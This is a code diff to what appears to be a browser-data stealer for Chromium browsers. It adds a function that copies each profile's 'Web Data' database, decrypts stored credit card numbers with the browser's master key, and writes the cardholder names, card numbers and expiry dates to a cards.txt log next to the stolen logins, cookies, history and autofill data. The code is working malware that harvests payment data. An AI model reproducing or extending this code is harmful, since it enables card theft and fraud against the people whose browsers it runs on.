@@ -160,6 +160,11 @@ def Write(pathToLogs, browser):
                 f.write(autofills)
         f.close()
     
+    if(cards):
+        with open(rf"{pathToLogs}\\{browser}\\cards.txt", "w", encoding="utf-8") as f:
+                f.write(cards)
+        f.close()
+    
         logins = ''''''
         cookies = ''''''
         history = ''''''
@@ -255,6 +260,40 @@ Value: {row[1]}
         pass
 
 
+def get_credit_cards(path, master_key):
+    try:
+        global cards
+        num = path.rfind("\\")
+        profile = path[num+1:]
+        cards += f"===============================\n\n\n{profile}:\n\n"
+        cards_db = f'{path}\\Web Data'
+        if not os.path.exists(cards_db):
+            return
+        copy2(cards_db, os.path.dirname(path)+'\\cards_db')
+        conn = connect(os.path.dirname(path)+'\\cards_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
+            card_number = decrypt_password(row[3], master_key)
+            cards += f"""
+Name On Card: {row[0]}
+Card Number: {card_number}
+Expires On:  {row[1]} / {row[2]}
+Added On: {datetime.fromtimestamp(row[4])}
+"""
+        conn.close()
+        try:
+            os.remove(os.path.dirname(path)+'\\cards_db')
+        except:
+            pass
+    except Exception as e:
+        #Log(f"{path} cards ---> {e}")
+        print(e)
+        pass
+
+
 def Chromium():
     global logins
     global cookies
@@ -307,6 +346,7 @@ def Chromium():
                     get_downloads(profile_path)
                     get_cookies(profile_path, master_key)
                     get_autofils(profile_path)
+                    get_credit_cards(profile_path, master_key)
                 except Exception as error:
                     #Log(f"{profile_path} ---> {error}")
                     pass
